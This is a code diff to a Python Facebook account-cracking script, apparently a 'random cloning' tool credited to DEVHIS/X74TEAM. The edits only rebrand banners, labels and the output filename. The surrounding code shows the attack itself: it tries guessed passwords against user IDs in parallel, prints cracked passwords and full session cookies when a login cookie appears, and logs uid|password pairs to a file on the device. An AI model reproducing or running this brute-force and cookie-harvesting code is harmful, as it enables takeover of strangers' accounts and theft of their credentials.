@@ -98,12 +98,19 @@ today = date.today()
 os.system('espeak -a 300 "WELCOME TO SAMIR RANDOM CLONING TOOLS"')
 logo=("""\033[1;37m
 
+######  ####### #     # #     # ###  #####  
+#     # #       #     # #     #  #  #     # 
+#     # #       #     # #     #  #  #       
+#     # #####   #     # #######  #   #####  
+#     # #        #   #  #     #  #        # 
+#     # #         # #   #     #  #  #     # 
+######  #######    #    #     # ###  #####  
 _____________________________
-Auther     : DEVHIS
-GitHub     : X74TEAM
+Auther        :  DEVHIS
+GitHub        :  X74TEAM
 Facebook   : HASAN IMAM
 Tools Type : FREE
-Version    : 1.0
+Version       : 1.0
 _____________________________
 """)
 
@@ -357,7 +364,7 @@ def sudair_pk():
                 pwx.append(sudair)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} --------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
+    print(f"\n{x} ------------------------------------------------------")
 
 
 
@@ -409,9 +416,9 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[sudair-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[ACTIVE] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                sn4gdh9('/sdcard/sudair-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                sn4gdh9('/sdcard/DEVHIS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -424,7 +431,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}ACTIVE{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr} Running{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
